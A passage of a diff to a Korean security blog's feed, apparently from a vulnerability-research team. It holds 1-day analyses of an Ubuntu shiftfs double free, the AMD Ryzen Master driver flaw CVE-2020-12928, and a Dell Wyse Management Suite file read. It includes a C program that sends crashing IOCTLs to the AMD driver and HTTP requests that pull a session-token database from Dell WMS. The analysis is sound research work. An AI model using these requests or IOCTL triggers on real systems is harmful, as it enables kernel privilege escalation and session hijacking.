됩니다. 해당 구조체는 userspace에서 복사되는 동안 <code>shiftfs_btrfs_ioctl_fd_replace</code>에 할당되며 커널 함수 <code>memdup_user</code>는 <code>copy_from_user</code>와 동시에 할당합니다.</p><p><code>shiftfs_btrfs_ioctl_fd_replace</code> 함수에서 <code>memdup_user</code>가 할당에 성공하고 <code>copy_to_user</code>는 실패하면 <code>shiftfs_btrfs_ioctl_fd_restore</code>에서 <code>kfree</code>를 호출하여 첫 번째 free를 진행하고 <code>shiftfs_real_ioctl</code>에서 다시 <code>shiftfs_btrfs_ioctl_fd_restore</code>를 호출하여 Potential leak과 <code>kfree</code>를 통한 두 번째 free가 가능하여 double free bug가 발생합니다.</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>1day1line</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>cve</tag>
+      
+      <tag>double free bug</tag>
+      
+      <tag>idioth</tag>
+      
+      <tag>ubuntu</tag>
+      
+      <tag>driver</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[Research] 공대오빠가 알려주는 Windows Driver Part 2 - CVE-2020-12928: AMD Ryzen Master 분석(1)</title>
+    <link href="/2021/07/14/l0ch/windows-driver-part2/"/>
+    <url>/2021/07/14/l0ch/windows-driver-part2/</url>
+    
+    <content type="html"><![CDATA[<p>안녕하세요! 한 달 만에 돌아온 윈도우 드라이버 시리즈입니다. 지난번 커널 디버깅 세팅에 이어 본격적으로 윈도우 third-party 드라이버 원데이를 분석해볼 건데요, 이제 보니까 시리즈 제목을 뭐같이 짓긴 했네요. 내가 왜 저랬을까..? </p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled.png" alt="windows-driver-part2/Untitled.png"></p><blockquote><p>다음 파트는 공대 “아저씨”가 알려주는 드라이버 취약점으로 돌아오겠습니다…</p></blockquote><h1 id="AMD-Ryzen-Master"><a href="#AMD-Ryzen-Master" class="headerlink" title="AMD Ryzen Master"></a>AMD Ryzen Master</h1><p><img src="/2021/07/14/l0ch/windows-driver-part2/AMD.png" alt="windows-driver-part2/AMD.png"></p><p>오늘 분석할 AMD Ryzen Master는 라이젠 CPU를 사용하시는 분들 중 오버클럭에 관심이 있다면 들어보셨을 익숙한 유틸리티입니다! 저도 작년에 라이젠 CPU를 처음 사서 인생 첫 오버클럭을 하려고 했는데, 바이오스 메뉴에서 뭘 어떻게 해야 할지 몰라서 얼타다가 마우스 클릭 몇 번에 오버클럭이 짠 하고 된다길래 유용하게 썼었죠. 물론 재부팅할 때마다 설정 적용해줘야 하는 게 귀찮아서 결국 바이오스에서 설정했습니다 ㅋㅋ!</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%201.png" alt="windows-driver-part2/Untitled%201.png"></p><blockquote><p>오버클럭도 못하는 컴알못ㅜ</p></blockquote><p>이건 여담인데, 지금 쓰는 CPU가 오버클럭 안한 순정상태에서는 블루스크린 뜨는데 오버클럭 하면 멀쩡하더라구요. 수율이 좋길래 그냥 쓰고 있는데.. 뭔가 찝찝한 건 기분 탓일 거야 아마</p><blockquote><p>본인(새컴 맞춰서 신남) : 님들 시퓨 순정은 블루스크린 뜨는데 오버클럭 하면 잘 돌아감 ㅋㅋ 신기하죠<br>??? : 우린 그걸 초기 불량이라고 부르기로 했어요.</p></blockquote><p>…? </p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%202.png" alt="windows-driver-part2/Untitled%202.png"></p><blockquote><p>그래도 1년째 잘 쓰고 있습니다..</p></blockquote><p>아무튼 오늘은 작년에 공개된 AMD Ryzen Master의 권한상승 취약점 CVE-2020-12928 을 분석해보도록 하겠습니다! OS환경은 Windows 10 빌드 19043.1083에서, 타겟인 AMD Ryzen Master는 취약한 AMDRyzenMasterDriverV15 버전의 드라이버가 포함된  2.1.1.1472 버전에서 진행했습니다. </p><p>구버전 찾는데 하루 종일 걸려버림 ㅎㅎ. .</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%203.png" alt="windows-driver-part2/Untitled%203.png"></p><blockquote><p>아 구버전 구하기 진짜 너무 어려웠다 ㅁㄴㅇㄹㄴㅇㅁㄹㅇㅁ</p></blockquote><p>이제.. 설치하고 설치 경로를 찾아가보면</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/tempsnip.png" alt="windows-driver-part2/tempsnip.png"></p><p>오늘의 주인공 드라이버는 위 경로에서 찾을 수 있습니다.</p><h1 id="Kernel-Driver-Driver-Exploit"><a href="#Kernel-Driver-Driver-Exploit" class="headerlink" title="Kernel Driver / Driver Exploit"></a>Kernel Driver / Driver Exploit</h1><p>본격적으로 분석을 하기 전에 드라이버가 어떤 것인지, 취약점에는 어떤 것이 있는지부터 알아봐야 합니다.</p><p>Windows Kernel은 모듈화가 되어 있으며 Core Kernel(Microkernel)과 Device Driver 두 가지로 나눌 수 있습니다. Core 모듈에는 Kernel의 핵심적인 기능이 구현되어 있고 대부분의 커널 기능은 driver 형태로 모듈화 되어 구현됩니다. 이러한 모듈화의 장점은 확장성과 유지보수가 용이하다는 점이 있겠네요!</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%204.png" alt="windows-driver-part2/Untitled%204.png"></p><blockquote><p>Windows NT 계열의 커널 아키텍처</p></blockquote><p>Windows에서 드라이버는 특정 이벤트가 발생할 때 커널 컨텍스트에서 실행되는 코드를 포함하는 모듈로 정의할 수 있습니다. 정리하면 커널 권한이 필요한 작업이 필요할 때 실행되는 코드를 모듈화 한 것입니다.  </p><p>위 사진에서 볼 수 있듯이 Windows는 User mode와 Kernel mode로 권한이 나뉘어 있습니다. User mode에서 실행되는 어플리케이션이 커널 권한이 필요한 작업을 요구할 때 커널 권한에 직접적으로 접근하는 것이 아닌 커널 권한으로 실행되는 드라이버에게 요청을 보내 간접적으로 수행하는 것이죠. 이때 User mode 어플리케이션은 I/O Manger를 통해 드라이버에게 요청을 보내는데, IOCTL(I/O Control) 코드로 드라이버가 어떤 기능을 수행할지를 결정합니다.</p><p>그렇다면, 이런 드라이버에서 찾을 수 있는 취약점은 어떤 것이 있을지 감이 오지 않나요?</p><p>드라이버의 취약점 공격에 성공하면 유저 권한의 어플리케이션으로는 할 수 없는 높은 권한에서의 임의 명령어 실행이 가능하고 타겟에게 더 큰 피해를 끼칠 수 있습니다. 이를 권한 상승 취약점(Privilege Escalation)이라고 부릅니다.</p><p>그런데 Microsoft가 바보도 아니고 커널 권한으로 돌아가는 드라이버는 좀 더 보안에 신경을 써서 개발했을 거 같지 않나요? 문제는 이 드라이버는 MS가 아닌 제삼자(third-party)도 개발하고 배포할 수 있어 발생합니다. </p><p>third-party driver는 보통 커널 레벨의 높은 권한을 요구하는 백신이나 하드웨어를 직접 제어하는 마우스, 모니터 드라이버, 하드웨어 모니터링 등의 제조사 유틸리티에서 많이 사용합니다. Microsoft가 Windows 커널과 자기네 드라이버를 아무리 심혈을 기울여 버그 없이 내놓는다고 해도 이런 third-party driver들이 있는 한 권한 상승 취약점은 팡팡 터질 것 같네요!</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%205.png" alt="windows-driver-part2/Untitled%205.png"></p><blockquote><p>요즘 핫한 PrintNightmare같은 프린터 스풀러 취약점이 터지는 거 보면 마소도 뭐.. 갈 길이 먼 것 같지만요 ㅎㅎ;;</p></blockquote><p>오늘 글을 보기 전 드라이버 익스플로잇에 대한 아래 번역글을 읽어보면 도움이 됩니다!</p><p><a href="https://hackyboiz.github.io/2021/04/21/l0ch/exploiting-driver/">[Translation] Exploiting System Mechanic Driver Part 1</a></p><p><a href="https://hackyboiz.github.io/2021/04/28/l0ch/exploiting-driver-part2/">[Translation] Exploiting System Mechanic Driver Part 2</a></p><h1 id="Vulnerability-Analysis"><a href="#Vulnerability-Analysis" class="headerlink" title="Vulnerability Analysis"></a>Vulnerability Analysis</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>이제 본격적으로 취약점을 분석해볼 차례입니다! 먼저 드라이버 서비스가 동작중인지 확인부터 해보겠습니다.</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/2.png" alt="windows-driver-part2/2.png"></p><p>WinObj로 확인해보면 AMDRyzenMasterDriverV15 디바이스가 올라온 것을 볼 수 있네요. </p><p><code>AMDRyzenMasterDriverV15.sys</code> 를 IDA로 열자마자 바로 <code>DriverEntry</code> 부터 찾아보죠</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%206.png" alt="windows-driver-part2/Untitled%206.png"></p><p><code>sub_140008A5C</code>로 가볼까요?</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/tempsnip%201.png" alt="windows-driver-part2/tempsnip%201.png"></p><p><code>DriverEntry</code>에서 첫 번째 매개변수로 <code>PDRIVER_OBJECT</code> 를 줬으니 매개변수 <code>a1</code>의 type을 <code>PDRIVER_OBJECT</code>로 변환합니다. 여기선 dispatch routine을 찾을 수 없네요.  <code>PDRIVER_OBJECT</code>를 매개변수로 전달하는 함수를 더 찾아보겠습니다. <code>sub_1400046AC</code>를 볼까요? </p><p><img src="/2021/07/14/l0ch/windows-driver-part2/tempsnip2.png" alt="windows-driver-part2/tempsnip2.png"></p><p>이번에는 <code>DRIVER_OBJECT-&gt;MajorFunction[14]</code>에 dispatch routine을 할당하는 코드를 찾을 수 있습니다! 장치명도 보이네요. </p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%207.png" alt="windows-driver-part2/Untitled%207.png"></p><p>dispatch routine에는 IOCTL 코드와 코드 별 루틴을 볼 수 있습니다.</p><h2 id="MmMapIoSpace"><a href="#MmMapIoSpace" class="headerlink" title="MmMapIoSpace"></a>MmMapIoSpace</h2><p>이제 함수 하나를 중점적으로 보면서 취약점을 찾아볼 텐데요, 타겟은 <code>MmMapIoSpace</code>로 정하겠습니다! <code>MmMapIoSpace</code>는 물리 주소를 가상 페이지 주소에 매핑하는 함수로, 함수 원형은 다음과 같습니다.</p><pre><code class="hljs c"><span class="hljs-function">PVOID <span class="hljs-title">MmMapIoSpace</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  PHYSICAL_ADDRESS    PhysicalAddress,  <span class="hljs-comment">// 매핑할 물리적 주소</span></span></span><span class="hljs-function"><span class="hljs-params">  SIZE_T              NumberOfBytes,   <span class="hljs-comment">//매핑할 바이트 수</span></span></span><span class="hljs-function"><span class="hljs-params">  MEMORY_CACHING_TYPE CacheType       <span class="hljs-comment">//매핑하는 데 사용할 캐시 속성을 나타내는 MEMORY_CACHING_TYPE 값</span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><p>왠지 이 함수 매개변수를 제어할 수 있으면 아주 좋은 공격 벡터가 될 것 같죠? </p><p><code>MmMapIoSpace</code> 관련 취약점은 MSI Dragon Center 권한상승을 다루는 하루한줄(<a href="https://hackyboiz.github.io/2021/06/22/l0ch/2021-06-22/">CVE-2021-29337: MSI Dragon Center의 로컬 권한 상승 취약점</a>) 에서도 언급된 적이 있었습니다. </p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%208.png" alt="windows-driver-part2/Untitled%208.png"></p><blockquote><p>이때 오늘 글 예고를 하기도 했었죠 ㅎㅎ</p></blockquote><p><img src="/2021/07/14/l0ch/windows-driver-part2/33.png" alt="windows-driver-part2/33.png"></p><p>cross reference view로 본 <code>MmMapIoSpace</code>를 호출하는 함수 리스트입니다. <code>sub_140007278</code> 함수를 보도록 할게요.</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%209.png" alt="windows-driver-part2/Untitled%209.png"></p><p>코드를 보고 분석해보면 간단하게 다음과 같이 정리가 가능합니다.</p><ul><li><code>MmMapIoSpace</code> 함수에 매개변수 <code>a1</code>와 <code>a2</code>를 각각 매핑하길 원하는 물리 주소와 길이를 전달합니다.</li><li><code>BaseAddress</code>에는 <code>MmMapIoSpace</code>의 반환 값인 물리 주소가 매핑된 가상 페이지 주소가 들어갑니다.</li><li><code>BaseAddress</code>가 NULL인지 확인하고 아니면 <code>NumberOfBytes</code>만큼 <code>a3</code> 버퍼의 값을 복사합니다.</li><li>복사가 완료되면 매핑된 주소를 매핑 해제하고 정상적으로 종료됩니다.</li></ul><p>해당 함수는 커널 메모리에 바이트 단위로 무언가를 쓰는 루틴으로 보입니다. 함수를 호출하는 dispatch routine으로 올라가 볼게요.</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%2010.png" alt="windows-driver-part2/Untitled%2010.png"></p><p>IOCTL 코드가 <code>0x81112F0C</code>일때 함수를 호출하네요. </p><p><code>MmMapIoSpace</code>를 호출하는 다른 함수인 <code>sub_1400063D0</code>을 보겠습니다.  </p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%2011.png" alt="windows-driver-part2/Untitled%2011.png"></p><p>위 함수는 비슷해 보이긴 하지만 한 가지가 다르네요?  <code>sub_140007278</code> 함수와 반대로 커널 메모리를 바이트 단위로 쓰는 루틴인 것 같습니다.</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%2012.png" alt="windows-driver-part2/Untitled%2012.png"></p><p>IOCTL <code>0x81112F08</code>일 때 해당 함수 루틴을 수행합니다.</p><p>위 두 함수의 <code>MmMapIoSpace</code> 로 전달되는 매개변수와 복사할 메모리 주소를 제어할 수 있으면 임의 쓰기 및 임의 읽기가 가능할 것 같다는 느낌적인 느낌이 오지 않나요?! 바로 테스트를 해볼게요.</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>&#123;    HANDLE dHandle;    WCHAR DeviceLink[] = <span class="hljs-string">L&quot;\\\\.\\AMDRyzenMasterDriverV15&quot;</span>;    DWORD dwRet = <span class="hljs-number">0</span>;    LPVOID output_buff = VirtualAlloc(<span class="hljs-literal">NULL</span>,        <span class="hljs-number">0x100c</span>,        MEM_COMMIT | MEM_RESERVE,        PAGE_EXECUTE_READWRITE);    dHandle = CreateFileW(        DeviceLink,        GENERIC_READ | GENERIC_WRITE,        <span class="hljs-number">0</span>,        <span class="hljs-literal">NULL</span>,        OPEN_EXISTING,        FILE_ATTRIBUTE_NORMAL,        <span class="hljs-literal">NULL</span>    );    <span class="hljs-keyword">if</span> (dHandle == INVALID_HANDLE_VALUE)    &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Get Device Handle Fail! : 0x%X \n&quot;</span>, GetLastError());        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    &#125;        BYTE input_buff[<span class="hljs-number">0x100</span>] = &#123; <span class="hljs-number">0</span>, &#125;;    <span class="hljs-keyword">if</span> (!DeviceIoControl(dHandle, <span class="hljs-number">0x81112F0C</span>, input_buff, <span class="hljs-number">0x40</span>, output_buff, <span class="hljs-number">0x100c</span>, &amp;dwRet, <span class="hljs-number">0</span>))    &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;DeviceIOControl Fail : 0x%X \n&quot;</span>, GetLastError());        CloseHandle(dHandle);        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    &#125;    CloseHandle(dHandle);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>위 코드에 대해서는 다음 파트에서 자세하게 설명하기로 하고, 지금은 <a href="https://docs.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol">DeviceIoControl</a> 를 호출하는 부분만 보면 됩니다.</p><pre><code class="hljs c">DeviceIoControl(dHandle, <span class="hljs-number">0x81112F0C</span>, input_buff, <span class="hljs-number">0x40</span>, output_buff, <span class="hljs-number">0x100c</span>, &amp;dwRet, <span class="hljs-number">0</span>)</code></pre><p>IOCTL code <code>0x81112F0C</code> 로 요청을 보내는데 input buffer와 output buffer를 사이즈와 함께 전달합니다. 여기서는 input buffer 내용을 모두 NULL로 채워서 전달했습니다.  </p><p><img src="/2021/07/14/l0ch/windows-driver-part2/BSOD.png" alt="windows-driver-part2/BSOD.png"></p><blockquote><p>블루스크린 겟!  : )</p></blockquote><p>다음 파트에서는 파트 1의 커널 디버깅으로 크래시를 동적 분석한 뒤 익스플로잇까지 해보도록 하겠습니다. 다음에 만나요 안녕!</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Research</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>windows</tag>
+      
+      <tag>kernel</tag>
+      
+      <tag>lpe</tag>
+      
+      <tag>L0ch</tag>
+      
+      <tag>local privilege escalation</tag>
+      
+      <tag>research</tag>
+      
+      <tag>windows driver</tag>
+      
+      <tag>third-party driver exploitation</tag>
+      
+      <tag>amd</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[하루한줄] CVE-2021-21586/21587: Dell Wyse Management Suite Arbitrary File Read</title>
+    <link href="/2021/07/13/l0ch/2021-07-13/"/>
+    <url>/2021/07/13/l0ch/2021-07-13/</url>
+    
+    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://research.nccgroup.com/2021/07/06/technical-advisory-arbitrary-file-read-in-dell-wyse-management-suite-cve-2021-21586-cve-2021-21587/">Technical Advisory – Arbitrary File Read in Dell Wyse Management Suite (CVE-2021-21586, CVE-2021-21587)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Dell Wyse Management Suit &lt; 3.3</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Dell의 클라우드 엔드포인트 관리 솔루션인 Wyse Management Suite(WMS)에서 데이터베이스 파일을 포함한 Arbitrary File Read 취약점의 세부 정보가 공개되었습니다.</p><p>WMS의 <code>/ccm-web/image/os</code> 는 <code>filePath</code>와 <code>fileName</code> 매개변수를 받아 시스템 경로에서 파일을 검색합니다. 장치 ID를 사용해 유효하지 않은 요청을 보내면 다음과 같이 오류 메세지를 반환합니다.</p><pre><code class="hljs c">PUT /ccm-web/image/pull/a/b HTTP/<span class="hljs-number">1.1</span>Host: [redacted]X-Stratus-device-id:wyse106[redacted]<span class="hljs-number">3149</span>-HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">500</span> Cache-Control: <span class="hljs-keyword">private</span>Expires: Thu, <span class="hljs-number">01</span> Jan <span class="hljs-number">1970</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> GMT...C:\Program Files\DELL\Software\repository\imagePull\staging\a\b (The system cannot find the path specified)</code></pre><p>오류 메세지에서 WMS가 설치된 시스템의 경로가 노출되며 아래와 같이 세션 토큰이 있는 MySQL 데이터베이스 테이블인 <code>[PATH]\DELL\WMS\Database\SQL\stratus\persistentlogin.ibd</code> 파일에서 JSESSIONID 값을 추출할 수 있고 이는 세션 하이재킹으로 이어질 수 있습니다.</p><pre><code class="hljs c">GET /ccm-web/image/os?filePath=C:\Program Files\DELL\WMS\Database\SQL\stratus&amp;fileName=persistentlogin.ibd HTTP/<span class="hljs-number">1.1</span>Host: [redacted]X-Stratus-device-id:wyse106[redacted]<span class="hljs-number">3149</span></code></pre><p>해당 취약점을 악용하면 관리 인터페이스의 BIOS 패스워드 재설정 및 VNC를 통한 원격 터미널 등의 기능에 액세스할 수 있습니다.</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>1day1line</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>cve</tag>
+      
+      <tag>L0ch</tag>
+      
+      <tag>arbitrary file read</tag>
+      
+      <tag>dell</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>[하루한줄] CVE-2021-28474: SharePoint Interpretation conflict RCE</title>
     <link href="/2021/07/12/fabu1ous/2021-07-12/"/>
     <url>/2021/07/12/fabu1ous/2021-07-12/</url>
